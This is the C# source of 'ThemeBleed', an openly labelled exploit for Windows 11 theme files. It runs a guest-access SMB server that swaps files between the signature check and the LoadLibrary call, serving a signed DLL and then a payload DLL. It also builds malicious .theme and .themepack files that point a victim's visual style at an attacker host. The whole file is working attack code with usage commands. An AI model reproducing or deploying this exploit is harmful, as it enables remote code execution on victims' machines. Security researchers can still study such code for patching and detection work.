using SMBLibrary.Authentication.GSSAPI;
using SMBLibrary.Authentication.NTLM;
using SMBLibrary;
using SMBLibrary.Server;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Diagnostics;

namespace SMBFilterDemo
{
    internal class Program
    {
        static string ShareDirectory;

        public static string GetUserPassword(string accountName)
        {
            if (accountName == "Guest")
            {
                return String.Empty;
            }
            return null;
        }

        public static void CreateFileFilter(CreateFileInfo createFileInfo)
        {
            if (createFileInfo.Path.EndsWith(".msstyles"))
            {
                Console.WriteLine("Client requested stage 1 - Version check");
                createFileInfo.Path = "\\??\\" + Path.Combine(ShareDirectory, "stage_1");
            }
            else if (createFileInfo.Path.EndsWith("_vrf.dll"))
            {
                if ((uint)createFileInfo.ShareAccess != 5) // if it's going to createfile, feed the signed dll
                {
                    Console.WriteLine("Client requested stage 2 - Verify signature");
                    createFileInfo.Path = "\\??\\" + Path.Combine(ShareDirectory, "stage_2");
                }
                else // if it's going to load library feed the payload
                {
                    Console.WriteLine("Client requested stage 3 - LoadLibrary");
                    createFileInfo.Path = "\\??\\" + Path.Combine(ShareDirectory, "stage_3");
                }
            }
        }

        static void RunServer()
        {
            ShareDirectory = Path.Combine(Directory.GetCurrentDirectory(), "data");
            SMBShareCollection shares = new SMBShareCollection();
            NTFilteredFileSystem FilteredFileSystem = new NTFilteredFileSystem(ShareDirectory);
            FilteredFileSystem.SetCreateFileFilter(CreateFileFilter);

            FileSystemShare share = new FileSystemShare("test", FilteredFileSystem);
            shares.Add(share);
            NTLMAuthenticationProviderBase authenticationMechanism = new IndependentNTLMAuthenticationProvider(GetUserPassword);
            GSSProvider securityProvider = new GSSProvider(authenticationMechanism);
            SMBServer server = new SMBServer(shares, securityProvider);
            server.Start(IPAddress.Parse("0.0.0.0"), SMBTransportType.DirectTCPTransport, false, true);
            Console.WriteLine("Server started");

            while (true)
            {

            }
        }

        static void CreateTheme(string host, string filePath)
        {
            string themeData = String.Format(@"; windows 11 theme exploit
; copyright 2023 fukin software foundation

[Theme]
DisplayName=@%SystemRoot%\System32\themeui.dll,-2060

[Control Panel\Desktop]
Wallpaper=%SystemRoot%\web\wallpaper\Windows\img0.jpg
TileWallpaper=0
WallpaperStyle=10

[VisualStyles]
Path=\\{0}\test\Aero.msstyles
ColorStyle=NormalColor
Size=NormalSize

[MasterThemeSelector]
MTSM=RJSPBS", host);
            File.WriteAllText(filePath, themeData);
        }

        static void CreateThemepack(string host, string filePath)
        {
            string tempPath = Path.Combine(Directory.GetCurrentDirectory(), "temp.theme");
            CreateTheme(host, tempPath);
            Process p = new Process();
            p.StartInfo.FileName = "makecab.exe";
            p.StartInfo.WorkingDirectory = Directory.GetCurrentDirectory();
            p.StartInfo.Arguments = tempPath + " " + filePath;
            p.Start();
            p.WaitForExit();
            File.Delete(tempPath);
        }

        static void Usage()
        {
            Console.WriteLine("Usage: ThemeBleed.exe <command>");
            Console.WriteLine("");
            Console.WriteLine("Commands:");
            Console.WriteLine("\tserver\t\t\t\t\t - Runs the server");
            Console.WriteLine("\tmake_theme <host> <output path>\t\t - Generates a .theme file referencing the specified host");
            Console.WriteLine("\tmake_themepack <host> <output_path>\t - Generates a .themepack file referencing the specified host");
        }

        static void Main(string[] args)
        {
            if (args.Length <1) 
            {
                Usage();
                return;
            }
            string command = args[0];

            if (command == "server")
            {
                RunServer();
            }
            if (command == "make_theme")
            {
                if (args.Length != 3)
                {
                    Console.WriteLine("Invalid number of arguments to make_theme!");
                    return;
                }
                CreateTheme(args[1], args[2]);
            }
            if (command == "make_themepack")
            {
                if (args.Length != 3)
                {
                    Console.WriteLine("Invalid number of arguments to make_themepack!");
                    return;
                }
                CreateThemepack(args[1], args[2]);
            }
        }
    }
}
